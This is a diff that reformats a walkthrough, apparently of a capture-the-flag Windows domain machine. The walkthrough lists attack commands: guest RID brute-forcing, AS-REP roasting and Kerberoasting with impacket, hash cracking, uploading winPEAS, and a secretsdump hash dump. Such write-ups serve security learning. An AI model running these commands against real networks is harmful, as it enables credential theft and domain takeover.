@@ -20,17 +20,17 @@ Process (Extra Verbose as I'm trying to level up my windows skills):
 
     * smbclient as guest to read only shares, get txt files, these give username hints
 
-* grab RIDs with guest user by brute force (crackmapexec smb \<host\> -u guest -p '' --rid-brute)
+* grab RIDs with guest user by brute force (`crackmapexec smb <host> -u guest -p '' --rid-brute`)
 
     * Make user file with list of names
 
-* roast login tokens that dont require preauth (AS-REP roasting) (impacket/examples/GetNPUsers.py \<host\> -dc-ip \<target ip\> -no-pass -usersfile /<users file/>)
+* roast login tokens that dont require preauth (AS-REP roasting) (`impacket/examples/GetNPUsers.py <host> -dc-ip <target ip> -no-pass -usersfile <users file>`)
 
     * crack roasted tokens with johntheripper (hashcat is an alternative)
 
     * try to winrm with these creds - no luck
 
-* Use newly cracked creds to re-roast (impacket/examples/GetUserSPNs.py \<host\>/user:pass -dc-ip \<target ip\> -request) (-outputfile optional)
+* Use newly cracked creds to re-roast (`impacket/examples/GetUserSPNs.py <host>/user:pass -dc-ip <target ip> -request`) (-outputfile optional)
 
     * crack these same as the previous creds
 
@@ -48,9 +48,9 @@ Process (Extra Verbose as I'm trying to level up my windows skills):
 
     * Priv esc
         
-        * Nothing useful in whoami /priv
+        * Nothing useful in `whoami /priv`
 
-        * Upload winpeas to C:\temp (mkdir temp first)
+        * Upload winpeas to C:\temp (`mkdir temp` first)
 
             * Had to upload bat version because windows detected the exe was a virus
 
@@ -58,17 +58,17 @@ Process (Extra Verbose as I'm trying to level up my windows skills):
 
 * Winrm shell as a-whitehat
 
-    * "whoami /groups" reveals domain admin group membership
+    * `whoami /groups` reveals domain admin group membership
 
-    * "whoami /priv" reveals a lot of privs, including some with privesc vectors
+    * `whoami /priv` reveals a lot of privs, including some with privesc vectors
 
         * Following the SeTakeOwnership vector on https://github.com/gtworek/Priv2Admin, I ran into a problem where it couldn't find the file I was targeting
 
         * I could have been more persistent and probably used this still
 
-    * moved on to impacket/examples/secretsdump with a-whitehat login
+    * moved on to secretsdump with a-whitehat login
 
-        * (impacket/examples/secretsdump.py '\<domain\>/\<user\>:\<pass\>@\<ip\>')
+        * (`impacket/examples/secretsdump.py '<domain>/<user>:<pass>@<ip>'`)
 
         * Yielded plenty of users and hashes
 
